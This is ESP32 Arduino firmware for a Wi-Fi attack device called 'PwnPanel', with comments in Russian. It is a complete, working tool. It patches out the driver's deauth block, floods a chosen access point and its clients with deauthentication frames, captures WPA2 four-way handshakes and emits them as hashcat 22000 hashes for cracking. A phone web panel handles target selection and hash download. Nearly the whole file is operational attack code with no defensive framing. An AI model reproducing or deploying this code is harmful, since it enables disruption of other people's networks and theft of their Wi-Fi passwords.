#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"

// ================== Конфиг панели ==================
#define AP_SSID "PwnPanel"
#define AP_PASS "deauth123"

// --- Комбо-режим (деаут + захват одновременно) ---
#define DEAUTH_BURST       25
#define DEAUTH_PAUSE_MS    1000

// Обход блокировки deauth в драйвере
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// --- NAT (hidden API, core 2.x / IDF 4.4) ---
extern "C" esp_err_t esp_netif_napt_enable(esp_netif_t* netif);

// ================== Состояние ==================
enum Mode { MODE_MENU, MODE_ATTACK, MODE_CAPTURE, MODE_COMBO, MODE_INTERNET };
Mode mode = MODE_MENU;

void stopAll();

struct NetInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
};
NetInfo nets[30];
int netCount = 0;
int target = -1;
unsigned long sentPackets = 0;
unsigned long deauthSentTotal = 0;

// --- Детальные счётчики (патч 1) ---
volatile unsigned long allFrames   = 0;
volatile unsigned long dataFrames  = 0;
volatile unsigned long bssidFrames = 0;   // кадры нашей цели
volatile unsigned long eapolFrames = 0;   // нашли LLC/SNAP EAPOL
volatile unsigned long rsnFrames   = 0;   // прошли проверку e[4]==2

// ================== Сбор клиентов (патч 2) ==================
uint8_t clients[8][6];
int     clientCount = 0;

// ================== Интернет-режим (NAT) ==================
char staSsid[33] = "";
char staPass[65] = "";
bool staLinked = false;

void checkInternet() {
  if (mode != MODE_INTERNET) return;
  if (WiFi.status() == WL_CONNECTED) {
    if (!staLinked) {
      staLinked = true;
      esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
      if (esp_netif_napt_enable(sta) == ESP_OK)
        Serial.println("[OK] NAT enabled. Phone gets internet via PwnPanel.");
      else
        Serial.println("[ERR] NAT failed (core version?)");
      Serial.printf("[OK] online: %s IP=%s\n", staSsid, WiFi.localIP().toString().c_str());
    }
  } else {
    if (staLinked) { staLinked = false; Serial.println("[..] STA lost, reconnecting..."); }
    WiFi.reconnect();
  }
}

void startInternet(const char* ssid, const char* pass) {
  if (mode != MODE_MENU && mode != MODE_INTERNET) stopAll();
  esp_wifi_set_promiscuous(false);
  strncpy(staSsid, ssid, sizeof(staSsid) - 1);
  staSsid[sizeof(staSsid) - 1] = 0;
  strncpy(staPass, pass, sizeof(staPass) - 1);
  staPass[sizeof(staPass) - 1] = 0;
  WiFi.mode(WIFI_AP_STA);                 // AP-панель остаётся работать
  WiFi.begin(staSsid, staPass);
  Serial.printf("[..] joining '%s'...\n", staSsid);
  mode = MODE_INTERNET;
  staLinked = false;
}

// ================== Захват рукопожатия (hashcat 22000) ==================
volatile unsigned long eapolCount = 0;
uint8_t apMac[6];

uint8_t  anonce[32];
bool     haveAnonce = false;
int      apMsg  = 0;
uint8_t  staEapol[260];
int      staEapolLen = 0;
uint8_t  staMic[16];
uint8_t  staMac[6];
int      staMsg = 0;
bool     hashEmitted = false;

static const int EAPOL_NONCE_OFF = 17;
static const int EAPOL_MIC_OFF   = 81;
static const int EAPOL_KDLEN_OFF = 97;
static const int EAPOL_BODY_LEN  = 95;

static const uint8_t llcEapol[] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
static const uint8_t bcast[6]   = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

// ================== Буфер хэшей для панели ==================
String hashBuf;
#define HASH_BUF_MAX 8000

void addHash(const String& s) {
  if (hashBuf.length() + s.length() > HASH_BUF_MAX) hashBuf = "";
  hashBuf += s;
}

// Формат 22000 + запись в буфер панели
void tryEmitHashcat() {
  if (!haveAnonce || staMsg == 0 || hashEmitted) return;

  int pair = -1;
  if      (apMsg == 1 && staMsg == 2) pair = 1;  // M1M2
  else if (apMsg == 1 && staMsg == 4) pair = 7;  // M1M4
  else if (apMsg == 3 && staMsg == 2) pair = 2;  // M2M3
  else if (apMsg == 3 && staMsg == 4) pair = 5;  // M3M4
  if (pair < 0) return;

  static char line[700];
  int pos = 0;
  pos += snprintf(line + pos, sizeof(line) - pos, "WPA*02*");
  for (int i = 0; i < 16; i++) pos += snprintf(line + pos, sizeof(line) - pos, "%02X", staMic[i]);
  pos += snprintf(line + pos, sizeof(line) - pos, "*");
  for (int i = 0; i < 6;  i++) pos += snprintf(line + pos, sizeof(line) - pos, "%02X", apMac[i]);
  pos += snprintf(line + pos, sizeof(line) - pos, "*");
  for (int i = 0; i < 6;  i++) pos += snprintf(line + pos, sizeof(line) - pos, "%02X", staMac[i]);
  pos += snprintf(line + pos, sizeof(line) - pos, "*");
  for (unsigned int i = 0; i < nets[target].ssid.length(); i++)
    pos += snprintf(line + pos, sizeof(line) - pos, "%02X", (uint8_t)nets[target].ssid[i]);
  pos += snprintf(line + pos, sizeof(line) - pos, "*");
  for (int i = 0; i < 32; i++) pos += snprintf(line + pos, sizeof(line) - pos, "%02X", anonce[i]);
  pos += snprintf(line + pos, sizeof(line) - pos, "*");
  for (int i = 0; i < staEapolLen; i++) pos += snprintf(line + pos, sizeof(line) - pos, "%02X", staEapol[i]);
  snprintf(line + pos, sizeof(line) - pos, "*0%d", pair);

  addHash(String(line) + "\n");
  Serial.println("###HASH_BEGIN");
  Serial.println(line);
  Serial.println("###HASH_END");
  hashEmitted = true;
}

// ================== Sniffer EAPOL ==================
void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  allFrames++;
  if (type != WIFI_PKT_DATA) return;
  dataFrames++;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  if (len < 24) return;                       // защита от битых кадров
  if ((p[0] & 0x0C) != 0x08) return;          // не data
  uint8_t ds = p[1] & 0x03;
  if (ds == 0x03) return;
  if (p[1] & 0x40) return;                    // зашифрованный data

  // --- патч 2: собираем MAC клиентов (кадры между AP и клиентами) ---
  {
    const uint8_t *da = p + 4, *sa = p + 10, *bss = p + 16;
    const uint8_t *peer = memcmp(bss, apMac, 6) == 0
                          ? (memcmp(sa, apMac, 6) == 0 ? da : sa) : nullptr;
    if (peer && memcmp(peer, bcast, 6) != 0) {
      bool known = false;
      for (int i = 0; i < clientCount; i++)
        if (!memcmp(clients[i], peer, 6)) { known = true; break; }
      if (!known && clientCount < 8) {
        memcpy(clients[clientCount++], peer, 6);
        Serial.printf("[CLI] client found: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      peer[0], peer[1], peer[2], peer[3], peer[4], peer[5]);
      }
    }
  }

  // --- патч 1: считаем кадры, связанные с целью (AP или её клиент) ---
  bool fromAP = (memcmp(p + 10, apMac, 6) == 0);
  if (fromAP || memcmp(p + 4, apMac, 6) == 0 || memcmp(p + 16, apMac, 6) == 0)
    bssidFrames++;

  int hdr = (p[0] & 0x80) ? 26 : 24;
  if (len < hdr + 8) return;

  if (memcmp(p + hdr, llcEapol, 8) != 0) return;
  eapolFrames++;                              // патч 1

  const uint8_t* e = p + hdr + 8;
  int avail = len - (hdr + 8);
  if (avail < 4 + EAPOL_BODY_LEN) return;

  // ФИЛЬТР: принимаем EAPOL только если цель участвует в кадре
  bool toAP = (memcmp(p + 4,  apMac, 6) == 0) || (memcmp(p + 16, apMac, 6) == 0);
  if (!fromAP && !toAP) {
    // разовый дамп чужого EAPOL — видно, кто мешает
    static unsigned long lastForeign = 0;
    if (millis() - lastForeign > 5000) {
      lastForeign = millis();
      Serial.printf("[EAPOL-FOREIGN] sta=%02X:%02X:%02X:%02X:%02X:%02X ap=%02X:%02X:%02X:%02X:%02X:%02X\n",
                    p[10], p[11], p[12], p[13], p[14], p[15],
                    p[16], p[17], p[18], p[19], p[20], p[21]);
    }
    return;
  }

  if (e[4] != 0x02) return;                   // только WPA2/RSN
  rsnFrames++;                                // патч 1

  uint16_t keyInfo = ((uint16_t)e[5] << 8) | e[6];
  uint16_t kdLen   = ((uint16_t)e[EAPOL_KDLEN_OFF] << 8) | e[EAPOL_KDLEN_OFF + 1];
  int total = 4 + EAPOL_BODY_LEN + kdLen;
  if (avail < total || total > 250) return;

  bool micBit = keyInfo & 0x0100;
  bool ackBit = keyInfo & 0x0080;
  bool secBit = keyInfo & 0x0200;

  eapolCount++;

  if (fromAP) {
    memcpy(anonce, e + EAPOL_NONCE_OFF, 32);
    haveAnonce = true;
    apMsg = ackBit ? 1 : 3;
    Serial.printf("[EAPOL] M%d from AP\n", apMsg);
  } else {
    if (!micBit) return;
    staMsg = secBit ? 4 : 2;
    memcpy(staMac, p + 10, 6);
    memcpy(staEapol, e, total);
    staEapolLen = total;
    memcpy(staMic, e + EAPOL_MIC_OFF, 16);
    memset(staEapol + EAPOL_MIC_OFF, 0, 16);
    Serial.printf("[EAPOL] M%d from client\n", staMsg);
    tryEmitHashcat();
  }
}

void resetCaptureState() {
  eapolCount = 0;
  haveAnonce = false; apMsg = 0;
  staMsg = 0; staEapolLen = 0;
  hashEmitted = false;
  // сброс счётчиков диагностики
  allFrames = 0; dataFrames = 0;
  bssidFrames = 0; eapolFrames = 0; rsnFrames = 0;
}

// ================== Режимы ==================
void startCapture() {
  if (target < 0 || target >= netCount) return;
  memcpy(apMac, nets[target].bssid, 6);
  WiFi.mode(WIFI_AP_STA);                     // панель остаётся жить!
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(nets[target].channel, WIFI_SECOND_CHAN_NONE);
  resetCaptureState();
  mode = MODE_CAPTURE;
  Serial.printf("[OK] capture: %s ch%d\n", nets[target].ssid.c_str(), nets[target].channel);
}

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void scanNetworks() {
  Serial.println("[..] scanning...");
  netCount = 0;
  esp_wifi_set_promiscuous(false);
  WiFi.scanNetworks(true /*async*/);
  // ждём завершения до 6 секунд
  unsigned long t0 = millis();
  while (WiFi.scanComplete() < 0 && millis() - t0 < 6000) delay(50);
  int n = WiFi.scanComplete();
  if (n < 0) n = 0;
  for (int i = 0; i < n && netCount < 30; i++) {
    bool dup = false;
    for (int j = 0; j < netCount; j++)
      if (memcmp(nets[j].bssid, WiFi.BSSID(i), 6) == 0) { dup = true; break; }
    if (dup) continue;
    nets[netCount].ssid = WiFi.SSID(i).length() ? WiFi.SSID(i) : "(hidden)";
    memcpy(nets[netCount].bssid, WiFi.BSSID(i), 6);
    nets[netCount].rssi = WiFi.RSSI(i);
    nets[netCount].channel = WiFi.channel(i);
    netCount++;
  }
  WiFi.scanDelete();
  // возвращаем канал цели (если активен режим)
  if (target >= 0 && mode != MODE_MENU && mode != MODE_INTERNET)
    esp_wifi_set_channel(nets[target].channel, WIFI_SECOND_CHAN_NONE);

  Serial.printf("[OK] found %d networks\n", netCount);
  for (int i = 0; i < netCount; i++)
    Serial.printf("%2d | %-20.20s | ch%-2d | %d dBm\n",
                  i, nets[i].ssid.c_str(), nets[i].channel, (int)nets[i].rssi);
}

void startCombo() {
  if (target < 0 || target >= netCount) return;
  memcpy(apMac, nets[target].bssid, 6);
  memcpy(deauthFrame + 10, nets[target].bssid, 6);
  memcpy(deauthFrame + 16, nets[target].bssid, 6);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(nets[target].channel, WIFI_SECOND_CHAN_NONE);
  resetCaptureState();
  sentPackets = 0;
  deauthSentTotal = 0;
  clientCount = 0;                            // патч 2: сброс списка клиентов
  mode = MODE_COMBO;
  Serial.printf("[OK] combo: %s ch%d\n", nets[target].ssid.c_str(), nets[target].channel);
}

void startAttack() {
  if (target < 0 || target >= netCount) return;
  memcpy(apMac, nets[target].bssid, 6);
  memcpy(deauthFrame + 10, nets[target].bssid, 6);
  memcpy(deauthFrame + 16, nets[target].bssid, 6);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(nets[target].channel, WIFI_SECOND_CHAN_NONE);
  resetCaptureState();
  sentPackets = 0;
  deauthSentTotal = 0;
  clientCount = 0;                            // патч 2: сброс списка клиентов
  mode = MODE_ATTACK;
  Serial.printf("[OK] attack: %s ch%d\n", nets[target].ssid.c_str(), nets[target].channel);
}

void stopAll() {
  esp_wifi_set_promiscuous(false);
  switch (mode) {
    case MODE_INTERNET:
      WiFi.disconnect();
      staLinked = false;
      Serial.println("[OK] internet mode stopped");
      break;
    case MODE_ATTACK:
      Serial.printf("[OK] attack stopped. sent=%lu\n", sentPackets); break;
    case MODE_CAPTURE:
      Serial.printf("[OK] capture stopped. eapol=%lu\n", eapolCount); break;
    case MODE_COMBO:
      Serial.printf("[OK] combo stopped. deauths=%lu eapol=%lu\n",
                    deauthSentTotal, eapolCount); break;
    default: break;
  }
  mode = MODE_MENU;
}

void printStatus() {
  const char* m = mode == MODE_MENU      ? "menu" :
                  mode == MODE_ATTACK    ? "attack" :
                  mode == MODE_CAPTURE   ? "capture" :
                  mode == MODE_COMBO     ? "combo" : "internet";
  Serial.printf("[STATUS] mode=%s target=%d deauths=%lu eapol=%lu "
                "anonce=%s staMsg=%d hash=%s clients=%d\n",
                m, target, deauthSentTotal, eapolCount,
                haveAnonce ? "yes" : "no", staMsg,
                hashEmitted ? "yes" : "no", clientCount);
}

// ================== Веб-панель ==================
WebServer server(80);

const char* PAGE_STYLE =
  "<meta name=viewport content='width=device-width'>"
  "<style>body{font-family:monospace;background:#111;color:#0f0;margin:0}"
  "h2{text-align:center}a,button{display:block;width:90%;margin:8px auto;padding:14px;"
  "font-size:18px;background:#222;color:#0f0;border:1px solid #0f0;text-decoration:none}"
  "pre{color:#ff0;word-break:break-all;padding:8px}</style>";

const char* modeName() {
  return mode == MODE_MENU      ? "idle" :
         mode == MODE_ATTACK    ? "attack" :
         mode == MODE_CAPTURE   ? "capture" :
         mode == MODE_COMBO     ? "combo" : "internet";
}

void handleRoot() {
  String html = "<html><head><title>PwnPanel</title>" + String(PAGE_STYLE) +
                "<meta http-equiv=refresh content='10'></head><body>"
                "<h2>PwnPanel</h2>"
                "<a href=/scan>SCAN NETWORKS</a>"
                "<a href=/list>TARGET LIST (" + String(netCount) + ")</a>"
                "<a href=/attack>DEAUTH ONLY</a>"
                "<a href=/combo>COMBO (DEAUTH+CAPTURE)</a>"
                "<a href=/capture>CAPTURE ONLY</a>"
                "<a href=/stop>STOP ALL</a>"
                "<a href=/status>STATUS</a>"
                "<a href=/netlist>INTERNET MODE (join wifi)</a>"
                "<a href=/hashes>HASHES</a>"
                "<a href=/hashdl>DOWNLOAD HASH FILE</a>"
                "<p style=text-align:center>target: " +
                String(target >= 0 ? nets[target].ssid : "-") +
                " | mode: " + modeName() +
                "</p></body></html>";
  server.send(200, "text/html", html);
}

void handleList() {
  String html = "<html><head><title>Targets</title>" + String(PAGE_STYLE) + "</head><body>";
  if (netCount == 0) html += "<p>No networks. <a href=/scan>SCAN</a></p>";
  for (int i = 0; i < netCount; i++) {
    html += "<a href=/sel?n=" + String(i) + "><b>" + String(i) + "</b> " +
            nets[i].ssid + " | ch" + String(nets[i].channel) +
            " | " + String((int)nets[i].rssi) + "dBm</a>";
  }
  html += "<a href=/>BACK</a></body></html>";
  server.send(200, "text/html", html);
}

void handleSel() {
  int n = server.arg("n").toInt();
  if (n >= 0 && n < netCount) {
    if (mode != MODE_MENU) stopAll();
    target = n;
    server.send(200, "text/html",
      "<html><head><meta http-equiv=refresh content='2;url=/'>" +
      String(PAGE_STYLE) + "</head><body><h2>Target: " + nets[n].ssid +
      " ch" + String(nets[n].channel) + "</h2></body></html>");
  } else server.send(400, "text/plain", "bad index");
}

void handleStatus() {
  String s = "mode=" + String(modeName()) +
             " target=" + (target >= 0 ? nets[target].ssid : "-") +
             " deauths=" + String(deauthSentTotal) +
             " eapol=" + String(eapolCount) +
             " anonce=" + String(haveAnonce ? "yes" : "no") +
             " staMsg=" + String(staMsg) +
             " hash=" + String(hashEmitted ? "ready" : "waiting") +
             " clients=" + String(clientCount) +
             " sta=" + String(WiFi.status() == WL_CONNECTED ? "connected" : "down") +
             " staip=" + (staLinked ? WiFi.localIP().toString() : "-");
  server.send(200, "text/plain", s);
}

void handleHashes() {
  String html = "<html><head><title>Hashes</title>" + String(PAGE_STYLE) +
                "</head><body><a href=/>BACK</a><pre>" +
                (hashBuf.length() ? hashBuf : "no hashes yet") +
                "</pre></body></html>";
  server.send(200, "text/html", html);
}

void handleHashDl() {
  server.sendHeader("Content-Disposition", "attachment; filename=hash22000.txt");
  server.send(200, "text/plain", hashBuf);
}

void runAndRedirect(const char* msg, void (*fn)()) {
  server.send(200, "text/html",
    String("<html><head><meta http-equiv=refresh content='2;url=/'>") +
    PAGE_STYLE + "</head><body><h2>" + msg + "</h2></body></html>");
  fn();
}

void setupWebRoutes() {
  server.on("/", handleRoot);
  server.on("/list", handleList);
  server.on("/sel", handleSel);
  server.on("/status", handleStatus);
  server.on("/hashes", handleHashes);
  server.on("/hashdl", handleHashDl);
  server.on("/scan",   [](){ runAndRedirect("SCANNING...", [](){
      if (mode != MODE_MENU) stopAll();
      scanNetworks();
  });});
  server.on("/attack",  [](){ runAndRedirect("DEAUTH ON",  startAttack); });
  server.on("/combo",   [](){ runAndRedirect("COMBO ON",   startCombo); });
  server.on("/capture", [](){ runAndRedirect("CAPTURE ON", startCapture); });
  server.on("/stop",    [](){ runAndRedirect("STOPPED",    [](){
      if (mode != MODE_MENU) stopAll();
  });});

  // ---- интернет-режим ----
  server.on("/join", [](){
    String ssid = server.arg("ssid"), pass = server.arg("pass");
    if (ssid.length()) {
      startInternet(ssid.c_str(), pass.c_str());
      server.send(200, "text/html",
        "<html><head><meta http-equiv=refresh content='5;url=/status'>"
        "<style>body{background:#111;color:#0f0;font-family:monospace}</style></head>"
        "<body><h2>Joining: " + ssid + "</h2></body></html>");
    } else server.send(400, "text/plain", "need ssid");
  });
  server.on("/netlist", [](){
    String html = "<html><head><title>Nets</title><style>body{font-family:monospace;"
      "background:#111;color:#0f0}a{display:block;padding:10px;color:#0f0}</style></head><body>";
    if (netCount == 0) html += "<p>No networks. <a href=/scan>SCAN</a></p>";
    for (int i = 0; i < netCount; i++)
      html += "<a href=/joinform?n=" + String(i) + ">" + nets[i].ssid + " (" +
              String((int)nets[i].rssi) + "dBm)</a>";
    html += "<a href=/>BACK</a></body></html>";
    server.send(200, "text/html", html);
  });
  server.on("/joinform", [](){
    int n = server.arg("n").toInt();
    if (n < 0 || n >= netCount) { server.send(400, "text/plain", "bad index"); return; }
    String html = "<html><head><title>Join</title><style>body{font-family:monospace;"
      "background:#111;color:#0f0}input{background:#222;color:#0f0;border:1px solid #0f0;"
      "padding:10px;width:80%}button{padding:10px;background:#222;color:#0f0;border:1px solid #0f0}"
      "</style></head><body><h2>" + nets[n].ssid + "</h2>"
      "<form action=/join method=get><input name=ssid value='" + nets[n].ssid + "'><br><br>"
      "<input name=pass type=password><br><br><button>CONNECT</button></form></body></html>";
    server.send(200, "text/html", html);
  });
}

// ================== Серийные команды ==================
char cmdBuf[64];
int  cmdLen = 0;

void handleListRaw() {
  for (int i = 0; i < netCount; i++)
    Serial.printf("%2d | %-20.20s | ch%-2d | %d dBm\n",
                  i, nets[i].ssid.c_str(), nets[i].channel, (int)nets[i].rssi);
  if (!netCount) Serial.println("[..] no nets, run scan");
}

void handleCommand(char* line) {
  while (*line == ' ') line++;
  int l = strlen(line);
  while (l > 0 && (line[l-1] == '\r' || line[l-1] == '\n' || line[l-1] == ' '))
    line[--l] = 0;
  if (l == 0) return;

  if      (strcmp(line, "scan")    == 0) { if (mode != MODE_MENU) stopAll(); scanNetworks(); }
  else if (strcmp(line, "list")    == 0) { handleListRaw(); }
  else if (strncmp(line, "sel ", 4) == 0) {
    int n = atoi(line + 4);
    if (n >= 0 && n < netCount) {
      if (mode != MODE_MENU) stopAll();
      target = n;
      Serial.printf("[OK] target %d: %s ch%d\n", n, nets[n].ssid.c_str(), nets[n].channel);
    } else Serial.println("[ERR] bad index");
  }
  else if (strcmp(line, "attack")  == 0) { if (mode != MODE_MENU) stopAll(); startAttack(); }
  else if (strcmp(line, "capture") == 0) { if (mode != MODE_MENU) stopAll(); startCapture(); }
  else if (strcmp(line, "combo")   == 0) { if (mode != MODE_MENU) stopAll(); startCombo(); }
  else if (strcmp(line, "stop")    == 0) { if (mode == MODE_MENU) Serial.println("[..] idle"); else stopAll(); }
  else if (strcmp(line, "status")  == 0) printStatus();
  else if (strcmp(line, "hashes")  == 0) Serial.println(hashBuf);
  else if (strncmp(line, "join ", 5) == 0) {
    char* ssid = line + 5;
    char* pass = strchr(ssid, ' ');
    if (pass) { *pass = 0; pass++; } else pass = (char*)"";
    startInternet(ssid, pass);
  }
  else if (strcmp(line, "leave") == 0) {
    if (mode == MODE_INTERNET) stopAll();
    else { WiFi.disconnect(); staLinked = false; }
    Serial.println("[OK] left network, back to menu");
  }
  else if (strcmp(line, "help")    == 0) {
    Serial.println("scan | list | sel <n> | attack | capture | combo | stop | status | hashes | join <ssid> <pass> | leave");
  }
  else Serial.printf("[ERR] unknown '%s'\n", line);
}

void pollSerial() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (cmdLen > 0) { cmdBuf[cmdLen] = 0; handleCommand(cmdBuf); cmdLen = 0; }
    } else if (cmdLen < (int)sizeof(cmdBuf) - 1) cmdBuf[cmdLen++] = c;
  }
}

// ================== Setup / Loop ==================
void setup() {
  Serial.begin(115200);
  delay(200);

  hashBuf.reserve(HASH_BUF_MAX + 100);

  // панель: AP + STA вместе
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("[OK] panel: http://%s (SSID %s, pass %s)\n",
                apIP.toString().c_str(), AP_SSID, AP_PASS);

  setupWebRoutes();
  server.begin();

  WiFi.setAutoReconnect(false);
  scanNetworks();
  Serial.println("[OK] ready. Panel + serial both active. Type 'help'.");
}

void loop() {
  server.handleClient();
  pollSerial();

  if (mode == MODE_INTERNET) {
    checkInternet();
  }
  else if (mode == MODE_ATTACK) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    sentPackets++; deauthSentTotal++;
    delayMicroseconds(1000000 / 200);           // 200 pkt/s
  }
  else if (mode == MODE_COMBO) {
    static unsigned long phaseStart = 0;
    static bool bursting = true;
    static unsigned long lastDbg = 0;
    if (millis() - lastDbg > 3000) {
      lastDbg = millis();
      Serial.printf("[DBG] all:%lu data:%lu bssid:%lu eapolF:%lu rsn:%lu eapol:%lu anonce:%s staMsg:%d\n",
                    allFrames, dataFrames, bssidFrames, eapolFrames, rsnFrames,
                    eapolCount, haveAnonce ? "yes" : "no", staMsg);
    }
    if (bursting) {
      // unicast-деаут каждому найденному клиенту + broadcast
      for (int c = 0; c <= clientCount; c++) {  // последний шаг = broadcast
        const uint8_t* dst = (c < clientCount) ? clients[c] : bcast;
        memcpy(deauthFrame + 4, dst, 6);        // addr1 = конкретный клиент
        for (int i = 0; i < 5; i++) {
          esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
          sentPackets++; deauthSentTotal++;
          delayMicroseconds(1000);
        }
      }
      bursting = false;
      phaseStart = millis();
    } else {
      if (millis() - phaseStart > DEAUTH_PAUSE_MS) bursting = true;
    }
  }
  else if (mode == MODE_CAPTURE) {
    static unsigned long lastDbg = 0;
    if (millis() - lastDbg > 3000) {
      lastDbg = millis();
      Serial.printf("[DBG] all:%lu data:%lu bssid:%lu eapolF:%lu rsn:%lu eapol:%lu anonce:%s staMsg:%d\n",
                    allFrames, dataFrames, bssidFrames, eapolFrames, rsnFrames,
                    eapolCount, haveAnonce ? "yes" : "no", staMsg);
    }
  }
}